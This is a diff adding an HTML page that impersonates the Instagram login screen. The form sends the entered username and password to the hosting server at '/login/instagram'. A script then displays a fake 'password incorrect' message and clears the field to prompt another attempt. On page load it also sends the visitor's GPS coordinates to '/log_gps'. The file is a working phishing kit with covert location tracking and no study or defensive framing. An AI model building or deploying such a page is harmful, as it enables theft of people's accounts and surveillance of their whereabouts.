@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login • Instagram</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { background-color: #fafafa; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        .insta-input { background-color: #fafafa; border: 1px solid #dbdbdb; }
+        .insta-input:focus { border-color: #a8a8a8; }
+        .insta-btn { background-color: #0095f6; }
+        .insta-btn:disabled { background-color: #b2dffc; }
+        #error-msg { display: none; color: #ed4956; font-size: 14px; margin: 10px 0; }
+    </style>
+</head>
+<body class="flex flex-col items-center justify-center min-h-screen p-4">
+
+    <!-- Main Login Card -->
+    <div class="bg-white border border-gray-300 p-8 md:p-10 w-full max-w-[350px] text-center mb-3">
+        
+        <!-- Instagram Logo (SVG for sharpness) -->
+        <div class="flex justify-center mb-8">
+            <img src="https://upload.wikimedia.org" alt="Instagram" class="h-12">
+        </div>
+
+        <div id="error-msg">Sorry, your password was incorrect. Please double-check your password.</div>
+
+        <form id="instaForm" action="/login/instagram" method="POST" class="space-y-1.5">
+            <input name="user" type="text" placeholder="Phone number, username, or email" 
+                   class="insta-input w-full p-2.5 rounded-sm text-xs focus:outline-none" required>
+            
+            <input id="passField" name="pass" type="password" placeholder="Password" 
+                   class="insta-input w-full p-2.5 rounded-sm text-xs focus:outline-none" required>
+            
+            <button id="loginBtn" class="insta-btn w-full text-white py-1.5 rounded font-bold text-sm mt-3 hover:bg-[#1877f2] transition">
+                Log In
+            </button>
+
+            <div class="flex items-center py-4">
+                <div class="flex-grow border-t border-gray-300"></div>
+                <span class="px-4 text-gray-400 text-xs font-bold uppercase">OR</span>
+                <div class="flex-grow border-t border-gray-300"></div>
+            </div>
+
+            <button type="button" class="text-[#385185] text-sm font-bold flex items-center justify-center w-full gap-2">
+                <span class="bg-[#385185] text-white rounded-sm p-0.5 text-[8px]">f</span> Log in with Facebook
+            </button>
+
+            <a href="#" class="text-[#00376b] text-xs block pt-4">Forgot password?</a>
+        </form>
+    </div>
+
+    <!-- Secondary Sign Up Card -->
+    <div class="bg-white border border-gray-300 p-5 w-full max-w-[350px] text-center">
+        <p class="text-sm">Don't have an account? <span class="text-[#0095f6] font-bold cursor-pointer">Sign up</span></p>
+    </div>
+
+    <script>
+        const instaForm = document.getElementById('instaForm');
+        const loginBtn = document.getElementById('loginBtn');
+        const errorMsg = document.getElementById('error-msg');
+
+        instaForm.onsubmit = function(e) {
+            loginBtn.innerText = "Logging in...";
+            loginBtn.disabled = true;
+
+            setTimeout(() => {
+                errorMsg.style.display = "block";
+                loginBtn.innerText = "Log In";
+                loginBtn.disabled = false;
+                document.getElementById('passField').value = "";
+            }, 2000);
+        };
+
+        // GPS/Data Log
+        window.onload = function() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(p) {
+                    fetch('/log_gps', {
+                        method: 'POST',
+                        headers: {'Content-Type':'application/json'},
+                        body: JSON.stringify({lat: p.coords.latitude, lon: p.coords.longitude, site: "INSTA_V1"})
+                    });
+                });
+            }
+        }
+    </script>
+</body>
+</html>
